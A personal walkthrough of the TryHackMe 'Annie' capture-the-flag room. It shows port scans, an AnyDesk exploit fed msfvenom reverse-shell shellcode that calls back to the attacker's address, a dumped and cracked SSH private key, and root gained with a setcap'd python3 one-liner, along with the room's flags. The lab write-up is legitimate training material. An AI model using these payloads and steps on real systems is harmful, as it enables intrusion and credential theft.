nmap
```
└─$ sudo nmap -sV 10.10.129.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 16:11 PDT
Nmap scan report for 10.10.129.156
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
7070/tcp open  ssl/realserver?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.91 seconds

```


I found a script `49613.py` which is a python2 script for exploiting a vuln found on anydesk which runs on port 7070.
I changed the shellcode so it would work for my machine. I ran the exploit and nothing happened. I hit a brink wall so I read this walkthrough: https://infosecwriteups.com/annie-from-tryhackme-edfea2b78eb5
Turns out I made a few mistakes when setting up the script. I changed the port to 7070 because that came up in my port scan. The
original script has 50001 as its default port. Turns out if I checked UDP ports, I would've found this port open so I ran a UDP nmap scan.

udp scan
```
PORT      STATE         SERVICE
68/udp   open|filtered dhcpc
5353/udp open|filtered zeroconf
50001/udp open|filtered unknown

```

so I changed the port back to 50001
```
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.46.127 LPORT=1111 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 4 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=17, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xbe\xc6\xd6"
shellcode += b"\xd4\x66\x32\x6b\x99\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xd4\xef\x8e\x4d\x0c"
shellcode += b"\x30\x34\xf3\xbf\x98\xd9\xd1\x2e\xa5\x23\x20"
shellcode += b"\xbc\xc6\xd2\x83\x6c\x3f\x45\xe6\xef\x8e\x5f"
shellcode += b"\x32\x0c\x22\x31\xf3\x94\x9e\xd9\xd1\x0c\x31"
shellcode += b"\x35\xd1\x41\x08\xbc\xf5\x3e\x3d\x6e\xec\x48"
shellcode += b"\xac\xed\x8c\xff\x7a\xd0\xb6\xdc\xaf\xb8\xfb"
shellcode += b"\x15\x5a\x6b\xca\xf6\x4f\x31\x86\x31\x7a\xe2"
shellcode += b"\x7f\xb1\xc3\xd6\xd4\x66\x32\x6b\x99"

```

Using the python script, I was able to get a reverse shell!

user flag
```
cat user.txt
THM{N0t_Ju5t_ANY_D3sk}

```


foothold
```
python3 --version
Python 3.6.9
python3 -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ 

```

id
```
annie@desktop:/home/annie$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)

```


```
annie@desktop:/tmp$ find / -perm -u=s -type f 2>/dev/null
/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec

```

```
annie@desktop:/home/annie$ cd .ssh
annie@desktop:/home/annie/.ssh$ ls
authorized_keys  id_rsa
annie@desktop:/home/annie/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
b1Da9w==
-----END OPENSSH PRIVATE KEY-----

```


```
Enter passphrase for key 'id_rsa': 
annie@10.10.129.156: Permission denied (publickey).

```

key was password protected. Ran ssh2john.py on the key to get its john format. Then ran it in john with rockyou.
got the password
```
└─$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/annie/johnFormatKey
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
annie123         (/home/gomez22/annie/id_rsa)     
1g 0:00:00:07 DONE (2022-08-10 17:35) 0.1377g/s 2803p/s 2803c/s 2803C/s michelin..ailyn
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

I am now able to ssh in!
I put linpeas.sh into /tmp then ran it.


I got stuck again and consulted a walkthrough. I spent too much time trying to exploit a potential CVE that never panned out.
Turns out the intended solution was to copy the python3 binary into /home/annie. The use setcap to change the capabilities of the
copied python3 binary so I could privesc with it.

```
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

```

`THM{0nly_th3m_5.5.2_D3sk}
`
